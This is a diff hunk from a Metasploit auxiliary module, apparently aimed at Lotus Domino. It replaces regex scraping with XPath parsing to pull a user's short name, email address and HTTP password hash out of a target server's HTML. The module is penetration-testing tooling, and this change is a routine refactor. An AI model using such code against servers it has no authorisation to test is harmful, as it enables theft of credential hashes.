@@ -157,14 +157,10 @@ class MetasploitModule < Msf::Auxiliary
       }, 25)
 
       if res && res.body
-        short_name = res.body.scan(/<INPUT NAME=\"ShortName\" TYPE=(?:.*) VALUE=\"([^"]+)\"/i).join
-        user_mail = res.body.scan(/<INPUT NAME=\"InternetAddress\" TYPE=(?:.*) VALUE=\"([^"]+)\"/i).join
-        pass_hash_candidates = res.body.scan(/<INPUT NAME=\"\$?dspHTTPPassword\" TYPE=(?:.*) VALUE=\"([^"]+)\"/i)
-        if pass_hash_candidates[0][0].nil? || pass_hash_candidates[0][0].strip.empty?
-          pass_hash = pass_hash_candidates[1][0] unless (pass_hash_candidates[1][0].nil? || pass_hash_candidates[1][0].strip.empty?)
-        else
-          pass_hash = pass_hash_candidates[0][0]
-        end
+        doc = res.get_html_document
+        short_name =  doc.xpath('//input[@name="ShortName"]/@value').text
+        user_mail =  doc.xpath('//input[@name="InternetAddress"]/@value').text
+        pass_hash = doc.xpath('//input[@name="$dspHTTPPassword" or @name="dspHTTPPassword"]/@value').first&.text
 
         short_name = 'NULL' if short_name.to_s.strip.empty?
         user_mail = 'NULL' if user_mail.to_s.strip.empty?
